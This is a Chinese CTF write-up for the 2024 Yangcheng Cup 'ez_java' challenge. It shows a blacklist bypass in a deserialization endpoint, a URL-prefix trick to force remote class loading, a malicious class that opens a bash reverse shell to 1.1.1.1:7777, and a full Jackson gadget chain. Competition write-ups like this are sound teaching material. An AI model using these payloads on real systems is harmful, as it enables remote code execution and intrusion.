---
title: 2024羊城杯ez_java题解
---

*作者：Narcher*	*时间：2024/8/28*	*分类：writeup*

<!--more-->

### 前言

题目本身不难，但有很多小细节容易没注意到，写下来做警示吧



### 正文

题目开启后，首页是个登录框：

<img src="2024%E7%BE%8A%E5%9F%8E%E6%9D%AFez_java%E9%A2%98%E8%A7%A3/image-20240828150602926.png" alt="image-20240828150602926" style="zoom:50%;" />

下载下来附件之后反编译拿源码

<img src="2024%E7%BE%8A%E5%9F%8E%E6%9D%AFez_java%E9%A2%98%E8%A7%A3/image-20240828150115425.png" alt="image-20240828150115425" style="zoom:50%;" />

注意到在config包下有shiro的身份验证的配置

<img src="2024%E7%BE%8A%E5%9F%8E%E6%9D%AFez_java%E9%A2%98%E8%A7%A3/image-20240828150331343.png" alt="image-20240828150331343" style="zoom: 67%;" />

<img src="2024%E7%BE%8A%E5%9F%8E%E6%9D%AFez_java%E9%A2%98%E8%A7%A3/image-20240828150407025.png" alt="image-20240828150407025" style="zoom:67%;" />

不过没啥用，因为在User类里边给了我们用户名和密码

<img src="2024%E7%BE%8A%E5%9F%8E%E6%9D%AFez_java%E9%A2%98%E8%A7%A3/image-20240828150456764.png" alt="image-20240828150456764" style="zoom: 67%;" />

登录进去之后，会有一个文件上传：

<img src="2024%E7%BE%8A%E5%9F%8E%E6%9D%AFez_java%E9%A2%98%E8%A7%A3/image-20240828150832531.png" alt="image-20240828150832531" style="zoom:50%;" />

我们看一下源码：

<img src="2024%E7%BE%8A%E5%9F%8E%E6%9D%AFez_java%E9%A2%98%E8%A7%A3/image-20240828150906849.png" alt="image-20240828150906849" style="zoom:50%;" />

差不多就是防止直接上传jsp🐎的，除了这个之外，还有一个路由有点意思：

<img src="2024%E7%BE%8A%E5%9F%8E%E6%9D%AFez_java%E9%A2%98%E8%A7%A3/image-20240828151007826.png" alt="image-20240828151007826" style="zoom:67%;" />

典型的反序列化，但自定义了个MyObjectInputStream类进行了过滤：

```java
private static final String[] blacklist = new String[]{"java.lang.Runtime", "java.lang.ProcessBuilder", "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", "java.security.SignedObject", "com.sun.jndi.ldap.LdapAttribute", "org.apache.commons.beanutils", "org.apache.commons.collections", "javax.management.BadAttributeValueExpException", "com.sun.org.apache.xpath.internal.objects.XString"};
```

我们再去看看依赖：

<img src="2024%E7%BE%8A%E5%9F%8E%E6%9D%AFez_java%E9%A2%98%E8%A7%A3/image-20240828151206428.png" alt="image-20240828151206428" style="zoom:50%;" />

<img src="2024%E7%BE%8A%E5%9F%8E%E6%9D%AFez_java%E9%A2%98%E8%A7%A3/image-20240828151219964.png" alt="image-20240828151219964" style="zoom:50%;" />

有CB依赖，jackson依赖等等，因为有过滤，剩下能用的就剩个jackson依赖触发任意getter了，我们再去看看User类：

<img src="2024%E7%BE%8A%E5%9F%8E%E6%9D%AFez_java%E9%A2%98%E8%A7%A3/image-20240828151416547.png" alt="image-20240828151416547" style="zoom:50%;" />

恰好有一个能利用的getter方法，里边是传统的URLClassLoader的远程类加载，可以加载.class或者.jar文件；还把http和file给禁用了，但它用的是startsWith禁用的，绕过方式有很多，比如在http或者file开头前加个url:或者jar:等等

例如：可以用`jar:http://1.1.1.1:8888/evil.jar!/`或者 `url:http://1.1.1.1:8888/evil.jar`远程加载jar；也可用`url:http://1.1.1.1:8888/`远程加载Evil.class

接下来要干的事情实际上很明确了：写一个恶意类，然后上传上去或者放vps上，然后远程类加载

恶意类我们就这样写：

```java
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Evil implements Serializable {
    private void readObject(ObjectInputStream in) throws IOException {
        Runtime.getRuntime().exec("bash -c {echo,<bash -i >& /dev/tcp/1.1.1.1/7777 0>&1的base64编码>}|{base64,-d}|{bash,-i}");
    }
}
```

然后`javac Evil.java`编译成.class文件直接上传到vps上，或者使用命令`jar -cvf evil.jar Evil.class`把.class文件再次压缩成jar包，然后python起一个web服务就好了，剩下的就是远程类加载的链和触发链了：

因为BadAttributeValueExpException被禁用了，链子就用jackson链的改编：

```java
import com.example.ycbjava.bean.User;
import com.example.ycbjava.utils.MyObjectInputStream;
import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisedSupport;

import javax.swing.event.EventListenerList;
import javax.swing.undo.CompoundEdit;
import javax.swing.undo.UndoManager;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.HashMap;
import java.util.Vector;

public class jackson {
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        User user = new User();
        user.setUsername("url:http://1.1.1.1:8888/"); //注意更改vps地址
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
        ctClass0.removeMethod(writeReplace);
        ctClass0.toClass();
        POJONode node = new POJONode(user);
        EventListenerList eventListenerList = new EventListenerList();
        UndoManager undoManager = new UndoManager();
        Field editsField = CompoundEdit.class.getDeclaredField("edits");
        editsField.setAccessible(true);
        Vector vector = (Vector) editsField.get(undoManager);
        vector.add(node);
        setValue(eventListenerList,"listenerList",new Object[]{InternalError.class, undoManager});
        HashMap hashMap = new HashMap();
        hashMap.put(user,eventListenerList);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashMap);
        objectOutputStream.close();
        byte[] serialize = byteArrayOutputStream.toByteArray();
        System.out.println(Base64.getEncoder().encodeToString(serialize));

        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
        objectInputStream.readObject();
    }
}
```

触发链就简单了，因为是反序列化触发，所以引一下就行了：

```java
        Evil evil = new Evil();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(evil);
        objectOutputStream.close();
        byte[] serialize = byteArrayOutputStream.toByteArray();
        System.out.println(Base64.getEncoder().encodeToString(serialize));
```

之后就挨个打就完了 

ps：还有一点要注意的，这道题目的传参方式虽然是POST传参，但传统POST传参貌似只会报error，只能用multipart/form-data的格式传参，这里也卡了我不少时间，需要注意一下



### 小结

java题的细节很多，要多多注意